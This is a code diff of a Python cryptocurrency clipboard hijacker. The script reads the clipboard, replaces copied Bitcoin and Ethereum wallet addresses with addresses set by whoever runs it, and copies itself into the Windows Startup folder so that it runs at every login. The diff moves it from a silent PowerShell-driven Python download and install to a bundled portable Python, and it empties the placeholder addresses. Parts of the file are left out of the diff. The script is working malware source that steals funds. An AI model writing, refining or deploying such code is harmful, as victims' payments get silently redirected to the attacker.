@@ -2,35 +2,34 @@ import os
 import subprocess
 import sys
 
-def install_python_and_pyperclip():
-    python_version = "3.9.10"
-    python_url = "https://www.python.org/ftp/python/3.9.10/python-3.9.10-amd64.exe"
-    python_path = f"C:\\Python\\{python_version}\\python.exe"
-
-    if not os.path.exists(python_path):
-        # Download Python installer
-        subprocess.run(["powershell.exe", f"(New-Object Net.WebClient).DownloadFile('{python_url}', 'python.exe')"])
-        # Install Python
-        subprocess.run(["python.exe", "/quiet", f"InstallAllUsers=1", f"TargetDir=C:\\Python\\{python_version}", "Include_test=0"])
-        os.remove("python.exe")
+def install_pyperclip():
+    # Change python_path to point to the portable Python executable
+    python_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ppython", "App", "Python", "python.exe")
+    
+    # Check if pip is installed
+    pip_check = subprocess.run([python_path, "-m", "pip", "--version"], capture_output=True, text=True)
+    
+    # If pip is not installed, add the pip files to the Python environment
+    if "not found" in pip_check.stderr:
+        ppython_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ppython")
+        sys.path.append(ppython_path)
 
     # Install pyperclip
     subprocess.run([python_path, "-m", "pip", "install", "pyperclip"])
 
-install_python_and_pyperclip()
-
-import os
 import pyperclip
 import shutil
+import random
+import os
 
 # Define the target addresses
 btc_addresses = {
-    "1": "YOUR_ADDRESS",
-    "bc1": "YOUR_ADDRESS",
-    "3": "YOUR_ADDRESS"
+    "1": "",
+    "bc1": "",
+    "3": ""
 }
 
-eth_addresses = ["YOUR_ADDRESS", "YOUR_ADDRESS", "YOUR_ADDRESS"]
+eth_addresses = ["", "", ""]
 
 def replace_address():
     current_address = pyperclip.paste().strip()
@@ -64,7 +63,8 @@ while True:
 script_path = os.path.abspath(sys.argv[0])
 
 # Specify the new folder path in the user's AppData folder
-new_folder_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+user_dir = os.path.expanduser('~')
+new_folder_path = os.path.join(user_dir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
 # Create the new folder if it doesn't exist
 os.makedirs(new_folder_path, exist_ok=True)
